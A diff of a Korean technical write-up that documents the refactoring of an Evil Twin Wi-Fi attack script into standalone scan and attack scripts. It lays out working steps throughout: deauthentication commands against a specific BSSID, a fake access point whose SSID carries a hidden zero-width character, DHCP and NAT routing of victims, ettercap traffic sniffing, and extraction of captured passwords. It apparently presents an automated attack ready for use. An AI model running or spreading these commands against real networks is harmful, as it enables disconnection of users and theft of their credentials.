@@ -1,228 +1,238 @@
-# wfast.sh 실행 흐름 정리
+# wfsat.sh 실행 흐름 정리
 
-> 분리된 파일 기준: `main.sh`, `utils.sh`, `attacks.sh`
-
----
-
-## 전체 흐름 요약
-
-```
-main()
- └─ evil_twin_attacks_menu()
-      ├─ [자동] et_option="2" → monitor_option()
-      ├─ [자동] et_option="4" → explore_for_targets_option()
-      └─ [자동] et_option="6" → (VIF 체크) → et_dos_menu()
-                                                └─ [자동] et_dos_option="3" → et_prerequisites()
-                                                                               └─ prepare_et_interface()
-                                                                                    └─ exec_et_sniffing_attack()
-```
+> **현재 파일 구조**
+> | 파일 | 역할 |
+> |------|------|
+> | `wfsat.sh` | 공통 함수 라이브러리 (565줄) |
+> | `et_sniffing_attack.sh` | Evil Twin Sniffing 공격 단독 실행 스크립트 |
+> | `et_scan.sh` | 주변 AP 스캔 → `et_config.conf` 자동 저장 |
+> | `et_config.conf` | 공격 설정값 저장 파일 |
 
 ---
 
-## 1. main() — `main.sh`
+## 전체 실행 흐름
 
-스크립트의 시작점. 아래 초기화 작업을 순서대로 수행한다.
+```
+[1단계] sudo ./et_scan.sh
+         └─ 모니터 모드 활성화
+         └─ airodump-ng 스캔 (15초)
+         └─ AP 목록 출력 → 사용자 선택
+         └─ et_config.conf에 bssid/essid/channel 저장
+         └─ Managed 모드 복구 (자동)
 
-| 단계 | 함수 | 설명 |
+[2단계] sudo ./et_sniffing_attack.sh
+         └─ et_config.conf 로드
+         └─ Pre-run validation (root 확인, 설정값 확인)
+         └─ exec_et_sniffing_attack()
+              ├─ set_hostapd_config   → Fake AP 설정 파일 생성
+              ├─ launch_fake_ap       → Fake AP 신호 송출 (hostapd)
+              ├─ set_network_interface_data → IP 대역 설정
+              ├─ set_dhcp_config      → DHCP 설정 파일 생성
+              ├─ set_std_internet_routing_rules → IP포워딩 + NAT + iptables
+              ├─ launch_dhcp_server   → DHCP 서버 실행
+              ├─ exec_et_deauth       → DoS 공격 시작
+              ├─ launch_ettercap_sniffing → 트래픽 스니핑 시작
+              ├─ set_et_control_script → 종료 스크립트 생성
+              ├─ launch_et_control_window → Control 창 실행
+              └─ write_et_processes  → PID 파일 기록
+                    ↓ [Ctrl+C 입력 시 _et_cleanup 호출]
+              ├─ kill_et_windows      → 모든 프로세스 종료
+              ├─ recover_current_channel → 채널 복구 (추적 모드 시)
+              ├─ clean_initialize_iptables_nftables → 방화벽 규칙 정리
+              ├─ restore_et_interface → 인터페이스 원상복구
+              ├─ parse_ettercap_log  → 캡처된 패스워드 추출
+              └─ clean_tmpfiles      → 임시 파일 정리
+```
+
+---
+
+## 0. et_config.conf — 설정 파일
+
+`et_sniffing_attack.sh`가 소스로 읽어 들이는 설정 파일.
+`et_scan.sh`가 스캔 결과를 이 파일에 자동으로 기록한다.
+
+```bash
+interface="wlan0"           # 공격에 사용할 무선 인터페이스
+internet_interface="eth0"   # 인터넷 연결된 인터페이스 (피해자에게 인터넷 제공용)
+phy_interface=""            # 물리 인터페이스 (비어 있으면 자동 탐지)
+
+# 타겟 AP 정보 (et_scan.sh가 채움)
+bssid="58:86:94:49:8C:C6"
+essid="deemo2.4"
+channel="11"
+
+# DoS 방식: "Auth DoS" | "Aireplay" | "mdk4 deauth"
+et_dos_attack="Aireplay"
+
+ettercap_log=1                           # 1 = 로그 저장
+ettercap_logpath="/tmp/et_sniffing_captured.txt"
+dos_pursuit_mode=0                       # 1 = DoS 추적 모드
+mac_spoofing_desired=0                   # 1 = MAC 스푸핑
+country_code="00"
+standard_80211n=0
+standard_80211ac=0
+standard_80211ax=0
+standard_80211be=0
+```
+
+---
+
+## 1. et_scan.sh — AP 스캔 스크립트
+
+공격 전 타겟 AP를 선택하고 설정을 저장하는 보조 스크립트.
+
+### 실행 흐름
+
+| 단계 | 동작 | 설명 |
 |------|------|------|
-| 1 | `initialize_script_settings` | 스크립트 기본 설정 초기화 |
-| 2 | `initialize_colors` | 색상 설정 |
-| 3 | `env_vars_initialization` | 환경 변수 초기화 |
-| 4 | `initialize_tmux` | tmux 환경 설정 (tmux 모드일 때) |
-| 5 | `detect_distro_phase1/2` | 리눅스 배포판 감지 |
-| 6 | `autodetect_language` | 언어 자동 감지 |
-| 7 | `iptables_nftables_detection` | 방화벽 도구 감지 |
-| 8 | `parse_plugins` | 플러그인 로드 |
-| 9 | `docker_detection` | 도커 환경 감지 |
-| 10 | `check_root_permissions` | root 권한 확인 |
-| → | `evil_twin_attacks_menu()` | **Evil Twin 메뉴로 진입** |
+| 1 | `et_config.conf` 로드 | `interface` 등 초기 설정 읽기 |
+| 2 | root 확인 | 비root → 종료 |
+| 3 | phy 인터페이스 탐지 | `iw dev ${interface} info` → `phy0` 등 |
+| 4 | 모니터 모드 활성화 | `airmon-ng check kill` → `iw set type monitor` |
+| 5 | airodump-ng 스캔 | 기본 15초 (`SCAN_DURATION` 환경변수로 변경 가능) |
+| 6 | CSV 파싱 | AP 섹션만 추출, BSSID·채널·신호강도·SSID 파싱 |
+| 7 | AP 목록 출력 | 신호 강도 순으로 정렬하여 번호 매김 |
+| 8 | 사용자 선택 | AP가 1개뿐이면 자동 선택 |
+| 9 | `et_config.conf` 업데이트 | `bssid`, `essid`, `channel`, `phy_interface` 저장 |
+| 10 | Managed 모드 복구 | EXIT trap으로 자동 실행 |
+
+### AP 목록 출력 예시
+```
+================================================================================
+ Num  BSSID              CH    Sig%  ENC     ESSID
+================================================================================
+ 1    58:86:94:49:8C:C6  11     72%  WPA2    deemo2.4
+ 2    AA:BB:CC:DD:EE:FF  6      45%  WPA2    iptime
+================================================================================
+[?] Select AP number (1-2):
+```
+
+### update_config_value()
+`et_config.conf` 내 특정 키의 값을 `awk`로 안전하게 교체하는 헬퍼 함수.
+특수문자(따옴표, 슬래시 등)가 포함된 SSID도 정상 처리됨.
+```bash
+update_config_value "bssid"   "58:86:94:49:8C:C6"
+update_config_value "essid"   "deemo2.4"
+update_config_value "channel" "11"
+```
 
 ---
 
-## 2. evil_twin_attacks_menu() — `main.sh`
+## 2. et_sniffing_attack.sh — Pre-run Validation
 
-원래는 사용자가 번호를 직접 입력하는 메뉴였지만,
-**필요한 옵션(2 → 4 → 6)이 코드에서 자동으로 실행**되도록 수정되어 있다.
+스크립트 최하단의 실행부. `exec_et_sniffing_attack()`을 호출하기 전 검증을 수행한다.
 
-### 옵션 2 — 모니터 모드 전환
 ```bash
-et_option="2"
-monitor_option "${interface}"
-```
-- 선택한 무선 인터페이스를 **모니터 모드**로 전환
-- 패킷 캡처 및 공격 수행을 위한 필수 전처리
-
-### 옵션 4 — 타겟 스캔
-```bash
-et_option="4"
-explore_for_targets_option
-```
-- `airodump-ng`로 주변 AP를 스캔
-- 타겟 선택 시 `bssid`, `channel`, `essid`, `enc`, `personal_network_selected` 값이 자동으로 채워짐
-- 숨겨진 SSID(Hidden SSID)는 클라이언트 재연결 시 Probe Request에서 노출됨
-- 일반 AP라면 옵션 4 이후 ask_bssid, ask_channel, ask_essid 모두 자동 스킵
-
-### 옵션 6 — Evil Twin Sniffing 공격 진입
-```bash
-et_option="6"
+# 시작 정보 출력
+echo "[*] Starting Evil Twin Sniffing Attack..."
+echo "    Target BSSID : ${bssid}"
+echo "    Target ESSID : ${essid}"
+echo "    Channel      : ${channel}"
+echo "    Interface    : ${interface}"
+echo "    DoS method   : ${et_dos_attack}"
 ```
 
-#### VIF(Virtual Interface) 지원 여부 분기
-
-| 조건 | 동작 |
-|------|------|
-| VIF 지원 O | 바로 `et_attack_adapter_prerequisites_ok=1` |
-| VIF 지원 X | `ask_yesno 696 "no"` → yes 선택 시 DoS 없이 진행 |
-
-**VIF란?**
-하나의 물리 어댑터에서 가상 인터페이스를 2개 생성하는 기능.
-Evil Twin 공격에서는 동시에 두 가지 역할이 필요하다.
-
-| 역할 | 모드 | 담당 |
+| 단계 | 코드 | 설명 |
 |------|------|------|
-| DoS (deauth 패킷 전송) | 모니터 모드 | 첫 번째 인터페이스 |
-| Fake AP 생성 | AP 모드 | 두 번째 인터페이스 (VIF 또는 별도 어댑터) |
-
-**VIF 없이 진행(yes 선택) 시 결과:**
-- Fake AP는 동작하지만 DoS 불가
-- 피해자가 자발적으로 또는 신호 끊김 시에만 Fake AP로 연결됨
-- 공격 효율 낮음
-
-**no 선택 시:** `et_attack_adapter_prerequisites_ok`가 1이 되지 않아 공격 취소 → 메뉴 처음으로 돌아감
-
-**어댑터 2개 사용 시:** VIF 경고 없이 정상 진행 (`secondary_wifi_interface` 사용)
-
-#### 포트 확인 후 et_dos_menu 호출
-```bash
-ports_needed["udp"]="${dhcp_port}"
-if check_busy_ports; then
-    et_mode="et_sniffing"
-    et_dos_menu
-fi
-```
+| 1 | `id -u` 확인 | 비root → 종료 |
+| 2 | 필수 변수 확인 | `interface`, `internet_interface`, `bssid`, `essid`, `channel`, `et_dos_attack` |
+| 3 | `phy_interface` 탐지 | 비어있으면 `physical_interface_finder`로 자동 탐지 |
+| 4 | `detect_distro_window_ratios` | 배포판별 xterm 창 비율 설정 |
+| 5 | `tmpdir` 생성 | `/tmp/ag1/` (인스턴스 번호에 따라 자동 결정) |
+| 6 | `check_interface_supported_bands` | 인터페이스 2.4GHz/5GHz 지원 여부 확인 |
+| → | `exec_et_sniffing_attack()` | **공격 시작** |
 
 ---
 
-## 3. et_dos_menu() — `main.sh`
-
-DoS 공격 방식 선택 메뉴. 자동으로 **옵션 3 (Auth DoS)** 선택.
-
-```bash
-et_dos_option="3"
-et_dos_attack="Auth DoS"
-```
-
-| 단계 | 함수 | 설명 |
-|------|------|------|
-| 1 | `dos_pursuit_mode_et_handler` | DoS 추적 모드 처리 |
-| 2 | `detect_internet_interface` | 인터넷 인터페이스 감지 |
-| 3 | `et_prerequisites` | **ET 공격 사전 준비** |
-
----
-
-## 4. et_prerequisites() — `main.sh`
-
-실제 공격 실행 전 최종 준비 단계. `et_sniffing` 모드 기준 흐름:
-
-| 단계 | 코드 | 설명 | 스킵 여부 |
-|------|------|------|-----------|
-| 1 | `ask_yesno 277 "yes"` | 공격 시작 최종 확인 (기본값: yes) | 입력 필요 |
-| 2 | `ask_yesno 419 "no"` | MAC 스푸핑 여부 (기본값: no) | 입력 필요 |
-| 3 | `ask_bssid` | 타겟 BSSID | 옵션 4에서 채워지면 자동 스킵 |
-| 4 | `ask_channel` | 채널 | 옵션 4에서 채워지면 자동 스킵 |
-| 5 | `ask_essid "noverify"` | SSID | 옵션 4에서 채워지면 자동 스킵 (Hidden SSID면 입력 필요) |
-| 6 | `validate_network_type "personal"` | 네트워크 타입 검증 | 옵션 4에서 자동 설정되어 통과 |
-| 7 | `manage_ettercap_log` | 로그 저장 여부 및 경로 설정 | 입력 필요 |
-
-### MAC 스푸핑이란?
-Fake AP의 MAC 주소(BSSID)를 진짜 AP와 동일하게 위조하는 것.
-
-| | SSID | BSSID |
-|--|------|-------|
-| 진짜 AP | iptime | AA:BB:CC:DD:EE:FF |
-| Fake AP (스푸핑 O) | iptime | AA:BB:CC:DD:EE:FF ← 동일 |
-| Fake AP (스푸핑 X) | iptime | 11:22:33:44:55:66 ← 다름 |
-
-### validate_network_type()
-`personal_network_selected` 또는 `enterprise_network_selected` 플래그 검증.
-옵션 4 타겟 선택 시 AP 타입(MGT/CMAC 여부)에 따라 자동 설정되므로 별도 입력 없이 통과.
-
-| 타입 | 특징 |
-|------|------|
-| personal | 일반 가정/소규모 AP, WPA/WPA2 PSK |
-| enterprise | 기업용, 802.1X 인증 (MGT/CMAC) |
-
-### manage_ettercap_log()
-`et_sniffing` 모드에서 호출. 로그 저장 여부 및 경로 설정.
-```
-"패스워드 로그 저장할까요?" (기본값: yes)
-→ yes: 파일명 = evil_twin_captured_passwords-{SSID}.txt
-→ no:  로그 없이 진행
-```
-
-모드별 로그 관리 함수:
-| 모드 | 함수 | 저장 내용 |
-|------|------|-----------|
-| et_sniffing | `manage_ettercap_log` | 패스워드 (파일 단위) |
-| et_sniffing_sslstrip2 | `manage_bettercap_log` | 패스워드 (파일 단위) |
-| enterprise | `manage_enterprise_log` | 크리덴셜 (폴더 단위) |
-
-### et_prerequisites() 마지막 단계
-```bash
-language_strings "${language}" 296 "yellow"  # "공격 시작합니다..." 출력
-language_strings "${language}" 115 "read"    # Enter 대기
-prepare_et_interface()                       # 공격 시작
-```
-
----
-
-## 5. prepare_et_interface() — `main.sh`
-
-모니터 모드로 전환했던 인터페이스를 **Managed 모드로 복귀**시킨다.
-Fake AP 생성에는 Managed 모드가 필요하기 때문.
-
-```bash
-et_initial_state=${ifacemode}
-if [ "${ifacemode}" != "Managed" ]; then
-    airmon stop wlan0mon → wlan0  # Managed 모드 복귀
-fi
-```
-
-이후 채널 파일 저장 및 공격 모드 분기:
-```bash
-echo "${channel}" > "${tmpdir}${channelfile}"  # 채널 임시 파일 저장
-
-case ${et_mode} in
-    "et_sniffing") exec_et_sniffing_attack ;;
-    ...
-esac
-```
-
----
-
-## 6. exec_et_sniffing_attack() — `attacks.sh`
+## 3. exec_et_sniffing_attack() — `et_sniffing_attack.sh`
 
 실제 공격 실행 함수. 순서대로 실행된다.
 
-| 단계 | 함수 | 역할 |
-|------|------|------|
-| 1 | `set_hostapd_config` | Fake AP 설정 파일 생성 |
-| 2 | `launch_fake_ap` | Fake AP 실행 (hostapd) |
-| 3 | `set_network_interface_data` | 네트워크 인터페이스 IP 설정 |
-| 4 | `set_dhcp_config` | DHCP 설정 파일 생성 |
-| 5 | `set_std_internet_routing_rules` | 인터넷 라우팅 규칙 설정 (iptables) |
-| 6 | `launch_dhcp_server` | DHCP 서버 실행 (피해자에게 IP 할당) |
-| 7 | `exec_et_deauth` | DoS 공격 실행 (deauth 패킷 전송) |
-| 8 | `launch_ettercap_sniffing` | ettercap 트래픽 스니핑 시작 |
-| 9 | `set_et_control_script` | 종료 제어 스크립트 생성 |
-| 10 | `launch_et_control_window` | 컨트롤 창 실행 |
-| 11 | `write_et_processes` | 실행 중인 프로세스 PID 기록 |
+```bash
+trap '_et_cleanup' SIGINT SIGTERM   # Ctrl+C 시 _et_cleanup 호출
+```
 
-### set_hostapd_config 상세
+### 인터페이스 Managed 모드 전환
+
+Fake AP(hostapd)를 실행하려면 인터페이스가 **Managed 모드**여야 한다.
+(기존 `wfast.sh`에서는 `prepare_et_interface()`가 담당하던 역할)
+
+```bash
+ip link set "${interface}" down
+iw "${interface}" set type managed   # airmon 없이 iw 직접 사용
+ip link set "${interface}" up
+echo "[+] Interface ready."
+```
+
+### 실행 순서
+
+| 단계 | 함수 | echo 출력 | 역할 |
+|------|------|-----------|------|
+| 1 | `set_hostapd_config` | `[*] Generating hostapd config...` | Fake AP 설정 파일 생성 |
+| 2 | `launch_fake_ap` | `[+] Fake AP launched.` | Fake AP 실행 (hostapd) |
+| 3 | `set_network_interface_data` | `[*] Configuring network interface...` | IP 대역 설정 |
+| 4 | `set_dhcp_config` | (연속 실행) | DHCP 설정 파일 생성 |
+| 5 | `set_std_internet_routing_rules` | `[+] Routing configured.` | iptables 라우팅 규칙 설정 |
+| 6 | `launch_dhcp_server` | `[+] DHCP server running.` | DHCP 서버 실행 |
+| 7 | `exec_et_deauth` | `[+] Deauth started.` | DoS 공격 실행 |
+| 8 | `launch_ettercap_sniffing` | `[+] Sniffer running.` | 트래픽 스니핑 시작 |
+| 9 | `set_et_control_script` | `[*] Setting up control window...` | 종료 제어 스크립트 생성 |
+| 10 | `launch_et_control_window` | (연속 실행) | Control 창 실행 |
+| 11 | `write_et_processes` | `[+] All components running.` | PID 기록 후 Ctrl+C 대기 |
+
+---
+
+## 4. _et_cleanup() — Ctrl+C 종료 핸들러
+
+`exec_et_sniffing_attack()`에서 `trap '_et_cleanup' SIGINT SIGTERM`으로 등록.
+Ctrl+C 입력 시 자동 호출된다.
+
+```bash
+function _et_cleanup() {
+    echo "[*] Stopping Evil Twin attack..."
+    echo "[*] Killing attack windows..."
+    kill_et_windows
+
+    if [ "${dos_pursuit_mode}" -eq 1 ]; then
+        recover_current_channel
+    fi
+
+    echo "[*] Cleaning up iptables rules..."
+    clean_initialize_iptables_nftables "end"
+
+    echo "[*] Restoring interface..."
+    restore_et_interface
+
+    if [ "${ettercap_log}" -eq 1 ]; then
+        echo "[*] Parsing ettercap log..."
+        parse_ettercap_log
+    fi
+
+    echo "[*] Cleaning up temp files..."
+    clean_tmpfiles "exit_script"
+    echo "[+] Cleanup complete."
+    exit 0
+}
+```
+
+| 단계 | 함수 | 조건 |
+|------|------|------|
+| 1 | `kill_et_windows` | 항상 |
+| 2 | `recover_current_channel` | `dos_pursuit_mode=1` 시 |
+| 3 | `clean_initialize_iptables_nftables "end"` | 항상 |
+| 4 | `restore_et_interface` | 항상 |
+| 5 | `parse_ettercap_log` | `ettercap_log=1` 시 |
+| 6 | `clean_tmpfiles "exit_script"` | 항상 |
+
+---
+
+## 5. 주요 함수 상세
+
+### set_hostapd_config
 
 #### 실행 순서
-1. `get_hostapd_version()` — hostapd 버전 확인 (버전에 따라 지원 옵션이 다름)
-2. `rm -rf /tmp/ag1/ag.hostapd.conf` — 기존 설정 파일 삭제 (깨끗하게 시작)
+1. `get_hostapd_version()` — hostapd 버전 확인 (버전에 따라 지원 옵션 다름)
+2. `rm -rf /tmp/ag1/ag.hostapd.conf` — 기존 설정 파일 삭제
 3. `generate_fake_bssid()` — 진짜 BSSID와 한 글자만 다른 가짜 BSSID 생성
 4. `generate_fake_essid()` — SSID 끝에 눈에 보이지 않는 ZWSP 문자 추가
 5. 설정값들을 파일에 기록
@@ -246,7 +256,6 @@ SSID 끝에 Zero Width Space(ZWSP, \xE2\x80\x8B) 유니코드 문자를 추가.
 #### 생성 위치
 `/tmp/ag1/ag.hostapd.conf`
 - `tmpdir` = `/tmp/ag1/` (인스턴스 번호에 따라 ag1, ag2... 자동 결정)
-- `hostapd_file` = `ag.hostapd.conf`
 
 #### 생성되는 파일 내용
 ```
@@ -274,12 +283,12 @@ ieee80211n=1        ← 지원 시 추가
 #### 파일 생명주기
 | 종료 방식 | 결과 |
 |----------|------|
-| 정상 종료 (메뉴 0번 or 공격 후 Enter) | `clean_tmpfiles "exit_script"` → `/tmp/ag1/` 전체 삭제 |
-| 비정상 종료 (Ctrl+C, 강제 종료) | `/tmp/ag1/ag.hostapd.conf` 파일 남아있음 |
+| 정상 종료 (Ctrl+C → _et_cleanup) | `clean_tmpfiles "exit_script"` → `/tmp/ag1/` 전체 삭제 |
+| 비정상 종료 (강제 kill 등) | `/tmp/ag1/ag.hostapd.conf` 파일 남아있음 |
 
 ---
 
-### launch_fake_ap 상세
+### launch_fake_ap
 
 #### hostapd란?
 무선 랜카드를 공유기처럼 동작하게 만들어주는 프로그램.
@@ -336,17 +345,9 @@ sleep 3
 - ❌ 인터넷 라우팅 없음
 - ❌ DoS 아직 시작 안 됨
 
-### 공격 종료 후 정리
-```bash
-kill_et_windows        # 모든 창 종료
-restore_et_interface   # 인터페이스 원상복구
-parse_ettercap_log     # 캡처된 패스워드 파싱
-clean_tmpfiles         # 임시 파일 정리
-```
-
 ---
 
-### set_network_interface_data 상세
+### set_network_interface_data
 
 **Fake AP 네트워크에서 사용할 IP 주소 범위를 설정**하는 함수.
 
@@ -388,7 +389,7 @@ fi
 
 ---
 
-### set_dhcp_config 상세
+### set_dhcp_config
 
 **DHCP 서버 설정 파일(`/tmp/ag1/ag.dhcpd.conf`)을 생성**하는 함수.
 
@@ -411,9 +412,6 @@ max-lease-time 7200;        # IP 임대 최대 시간 2시간
 | et_sniffing | 진짜 DNS (8.8.8.8 등) | 피해자가 정상 인터넷 사용하면서 트래픽 스니핑 |
 | captive_portal | 공격자 IP (192.169.1.1) | 모든 도메인을 가짜 페이지로 redirect |
 
-#### leases 파일 탐색
-배포판마다 dhcp.leases 파일 위치가 다르기 때문에 존재하는 파일을 찾아서 설정에 포함.
-
 #### 생성되는 파일 내용
 ```
 authoritative;
@@ -427,40 +425,6 @@ subnet 192.169.1.0 netmask 255.255.255.0 {
     range 192.169.1.33 192.169.1.100;
 }
 ```
-
----
-
-## 핵심 변수 정리
-
-| 변수 | 설명 |
-|------|------|
-| `interface` | 주 무선 인터페이스 |
-| `secondary_wifi_interface` | 보조 무선 인터페이스 (어댑터 2개 시) |
-| `et_mode` | Evil Twin 모드 (`et_sniffing` 등) |
-| `et_dos_attack` | DoS 공격 방식 (`Auth DoS` 등) |
-| `bssid` | 타겟 AP의 MAC 주소 |
-| `channel` | 타겟 AP의 채널 |
-| `essid` | 타겟 AP의 SSID |
-| `enc` | 타겟 AP의 암호화 방식 (WPA/WPA2 등) |
-| `et_attack_adapter_prerequisites_ok` | 공격 진행 가능 여부 플래그 |
-| `mac_spoofing_desired` | MAC 스푸핑 여부 플래그 |
-| `dos_pursuit_mode` | DoS 추적 모드 활성화 여부 |
-| `personal_network_selected` | 개인 네트워크 선택 여부 플래그 |
-| `enterprise_network_selected` | 기업 네트워크 선택 여부 플래그 |
-| `ettercap_log` | ettercap 로그 저장 여부 플래그 |
-| `tmpdir` | 임시 파일 저장 경로 (`/tmp/ag1/`) |
-
----
-
-## 임시 파일 목록 (`/tmp/ag1/`)
-
-| 파일명 | 설명 |
-|--------|------|
-| `ag.hostapd.conf` | Fake AP 설정 파일 |
-| `ag.channelfile` | 타겟 채널 번호 |
-| `ag.dhcpd.conf` | DHCP 서버 설정 파일 |
-
----
 
 ---
 
@@ -486,21 +450,25 @@ dhcpd -d -cf "/tmp/ag1/ag.dhcpd.conf" wlan0 2>&1 | tee -a /tmp/ag1/clts.txt
 
 **DoS 공격(deauth)을 실행**하는 함수. 진짜 AP와 피해자의 연결을 강제로 끊음.
 
-#### DoS 방식별 명령어 (Auth DoS 선택 시)
+#### DoS 방식별 명령어
 ```bash
-# Auth DoS → mdk4 사용
+# Auth DoS → mdk4 사용 (et_config.conf의 et_dos_attack="Auth DoS")
 mdk4 wlan0mon a -a 58:86:94:49:8C:C6 -m
 
-# Aireplay 방식
-aireplay-ng --deauth 0 -a 58:86:94:49:8C:C6 wlan0mon
+# Aireplay 방식 (et_dos_attack="Aireplay")
+# ※ -D 플래그 추가: 드라이버 의존성 무시 (일부 환경에서 필요)
+aireplay-ng --deauth 0 -a 58:86:94:49:8C:C6 --ignore-negative-one -D wlan0mon
 
-# mdk4 deauth 방식
+# mdk4 deauth 방식 (et_dos_attack="mdk4 deauth")
 mdk4 wlan0mon d -b /tmp/ag1/bl.txt -c 6
 ```
 
+> **변경사항**: Aireplay 명령어에 `-D` 플래그 추가됨.
+> 일부 드라이버에서 발생하는 "unsupported" 오류를 무시하고 강제 실행.
+
 - `prepare_et_monitor` → DoS용 모니터 모드 인터페이스 준비
 - 창 색상: 검정 바탕 + **빨간 글씨**
-- DoS 추적 모드(`dos_pursuit_mode`)일 때 → 피해자가 채널을 바꿔도 추적하며 계속 deauth
+- DoS 추적 모드(`dos_pursuit_mode=1`)일 때 → 피해자가 채널을 바꿔도 추적하며 계속 deauth
 
 ---
 
@@ -518,7 +486,7 @@ ettercap -i wlan0 -q -T -z -S -u -l "/tmp/ag1/ag.ettercap"
 - `-z` → 비프로미스큐어스 모드
 - `-S` → SSL 비활성
 - `-u` → 유니코드 지원 비활성
-- `-l` → 로그 저장 (저장 선택 시)
+- `-l` → 로그 저장 (`ettercap_log=1` 시)
 - 창 색상: 검정 바탕 + **노란 글씨**
 
 이 시점부터 Fake AP를 통해 오가는 **모든 트래픽이 캡처**됨.
@@ -563,17 +531,6 @@ done
 ```
 
 `set_et_control_script`에서 생성한 종료 스크립트가 이 파일을 읽어서 프로세스를 종료함.
-
----
-
-### 공격 실행 중 (Enter 대기)
-
-```bash
-language_strings "${language}" 298 "yellow"  # "공격 중입니다. 종료하려면 Enter..."
-language_strings "${language}" 115 "read"    # Enter 입력 대기
-```
-
-사용자가 Enter를 누를 때까지 공격이 계속 실행됨.
 
 ---
 
@@ -649,28 +606,47 @@ USER: admin
 PASS: password123
 ```
 
-캡처된 패스워드가 있으면 지정한 경로에 저장, 없으면 "캡처된 패스워드 없음" 메시지 출력.
+캡처된 패스워드가 있으면 `ettercap_logpath`에 저장, 없으면 "캡처된 패스워드 없음" 메시지 출력.
 
 ---
 
-## exec_et_sniffing_attack 전체 흐름 요약
+## 핵심 변수 정리
 
-```
-set_hostapd_config       → Fake AP 설정 파일 생성
-launch_fake_ap           → Fake AP 신호 송출 시작 (hostapd)
-set_network_interface_data → IP 대역 설정
-set_dhcp_config          → DHCP 설정 파일 생성
-set_std_internet_routing_rules → IP포워딩 + NAT + iptables 규칙 설정
-launch_dhcp_server       → DHCP 서버 실행 (피해자 IP 할당)
-exec_et_deauth           → DoS 공격 시작 (피해자 강제 연결 해제)
-launch_ettercap_sniffing → 트래픽 스니핑 시작
-set_et_control_script    → 종료 스크립트 생성
-launch_et_control_window → Control 창 실행
-write_et_processes       → PID 파일 기록
-  ↓ [Enter 입력 대기]
-kill_et_windows          → 모든 프로세스 종료
-recover_current_channel  → 채널 복구 (DoS 추적 모드 시)
-restore_et_interface     → 인터페이스 원상복구
-parse_ettercap_log       → 캡처된 패스워드 추출 및 저장
-clean_tmpfiles           → 임시 파일 정리
-```
+### et_config.conf에서 로드되는 변수
+
+| 변수 | 설명 |
+|------|------|
+| `interface` | 주 무선 인터페이스 (예: wlan0) |
+| `internet_interface` | 인터넷 연결 인터페이스 (예: eth0) |
+| `phy_interface` | 물리 인터페이스 (예: phy0, 자동 탐지 가능) |
+| `bssid` | 타겟 AP의 MAC 주소 |
+| `essid` | 타겟 AP의 SSID |
+| `channel` | 타겟 AP의 채널 |
+| `et_dos_attack` | DoS 공격 방식 (`Auth DoS` / `Aireplay` / `mdk4 deauth`) |
+| `ettercap_log` | ettercap 로그 저장 여부 (0/1) |
+| `ettercap_logpath` | 로그 저장 경로 |
+| `dos_pursuit_mode` | DoS 추적 모드 활성화 여부 (0/1) |
+| `mac_spoofing_desired` | MAC 스푸핑 여부 (0/1) |
+| `country_code` | 국가 코드 (예: KR, 00) |
+| `standard_80211n/ac/ax/be` | 무선 표준 지원 여부 (0/1) |
+
+---
+
+## 임시 파일 목록 (`/tmp/ag1/`)
+
+| 파일명 | 생성 시점 | 설명 |
+|--------|-----------|------|
+| `ag.hostapd.conf` | `set_hostapd_config` | Fake AP 설정 파일 |
+| `ag.channelfile` | `exec_et_sniffing_attack` 시작 시 | 타겟 채널 번호 |
+| `ag.dhcpd.conf` | `set_dhcp_config` | DHCP 서버 설정 파일 |
+| `clts.txt` | `launch_dhcp_server` | DHCP 할당 내역 (피해자 접속 로그) |
+| `ag.ettercap` | `launch_ettercap_sniffing` | ettercap 캡처 로그 |
+| `ag.et_processes` | `write_et_processes` | 실행 중인 프로세스 PID |
+| `ag.control_et.sh` | `set_et_control_script` | 공격 종료 제어 스크립트 |
+
+정상 종료 시 `clean_tmpfiles "exit_script"` → `/tmp/ag1/` 전체 삭제.
+비정상 종료(강제 kill 등) 시 파일이 남아있음 → 다음 실행 시 `set_hostapd_config`에서 삭제.
+
+---
+
+*다음 단계: et_scan.sh CSV 파싱 로직 및 et_sniffing_attack.sh 추가 함수 상세 분석*
